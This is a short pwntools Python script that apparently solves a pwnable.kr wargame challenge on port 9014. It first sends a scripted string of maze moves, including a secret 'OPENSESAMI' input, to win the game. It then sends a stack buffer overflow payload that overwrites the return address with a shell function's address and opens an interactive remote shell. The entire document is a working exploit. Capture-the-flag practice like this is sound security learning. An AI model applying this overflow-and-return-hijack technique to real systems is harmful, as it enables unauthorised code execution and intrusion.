from pwn import *

WIN_GAME = b"""\n\nssdssddssdddssasssddddssddddd
ssdddwwdddssdsssddssddssddssssasssd
ssdddwwdddssddsassaaaaaaaaaaaaaaaassassasssddddssddddd
ssdddwwddddssddsssassddsssdddsdddsssassd
ssdsssddssddddwdddssddsdddssaasasswdwawsdwwwwwaaaaawaasswawwdaadwdawaadddssaaOPENSESAMIIsssddddddddddddaaaaaaaaaaaawwswsadwswwsswsswwdwdadddddd"""

SHELL_ADDRESS = 0x00000000004017B4
GET_SHELL_PAYLOAD = b'A' * 0x30 + b'B' * 0x8 + p64(SHELL_ADDRESS)

conn = remote('pwnable.kr', 9014)

conn.recv()
conn.send(WIN_GAME)
conn.recv()
conn.send(GET_SHELL_PAYLOAD + b'\n')
conn.interactive()

conn.close()